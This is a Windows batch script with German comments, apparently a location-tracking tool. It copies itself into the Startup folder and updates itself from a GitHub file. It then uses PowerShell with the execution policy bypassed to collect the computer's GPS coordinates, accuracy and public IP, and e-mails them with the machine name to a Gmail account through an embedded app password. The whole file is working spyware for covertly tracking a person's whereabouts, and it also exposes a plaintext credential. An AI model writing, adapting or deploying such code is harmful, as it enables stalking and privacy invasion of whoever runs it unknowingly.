@echo off

setlocal

:: Updater
set "REPO_URL=https://github.com/GraficPixelTDSM/GeoLocSend/raw/main/NewVersion.bat"
set "LOCAL_FILE_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\NewVersion.bat"

powershell -command "(New-Object Net.WebClient).DownloadFile('%REPO_URL%', '%TEMP%\NewVersion.bat')"

fc "%TEMP%\NewVersion.bat" "%LOCAL_FILE_PATH%" > nul
if %errorlevel% neq 0 (
    echo > 
    :: Neue Version: Aktualisieren
    copy /y "%TEMP%\NewVersion.bat" "%LOCAL_FILE_PATH%"
    echo >
    :: Aktualisierung abgeschlossen
) else (
    echo >
    :: Keine neue Version gefunden
)

:: Autostart Saver
set AutostartFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

if not exist "%AutostartFolder%\%~nx0" (
    xcopy "%~f0" "%AutostartFolder%\" /H /Y
    echo >
    :: Updating
) else (
    echo >
    :: Updated
)

:: LocData Sender
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Add-Type -AssemblyName System.Device; " ^
    "$ipinfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'; " ^
    "$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher; " ^
    "$GeoWatcher.Start(); " ^
    "while ($GeoWatcher.Status -ne 'Ready') { Start-Sleep -Milliseconds 100 }; " ^
    "$Location = $GeoWatcher.Position.Location; " ^
    "$accuracy = $Location.HorizontalAccuracy; " ^

    "$Body = 'IP: ' + $ipinfo.ip + [System.Environment]::NewLine + 'Lati-/ Longitude: ' + [System.Environment]::NewLine + $Location.Latitude + ' ' + $Location.Longitude + [System.Environment]::NewLine + $accuracy + [System.Environment]::NewLine + 'https://www.google.com/maps/place/' + $Location.Latitude + ',' + $Location.Longitude; " ^

    "$From = 'thomasscmtrp@gmail.com'; " ^
    "$To = 'thomasscmtrp@gmail.com'; " ^
    "$Name = $env:computername; " ^
    "$Subject = 'Location from ' + $($Name); " ^
    "$Password = 'inxp oacj koiw ytgi' | ConvertTo-SecureString -AsPlainText -Force; " ^

    "$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password; " ^

    "Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer 'smtp.gmail.com' -port 587 -UseSsl -Credential $Credential;"

exit

endlocal
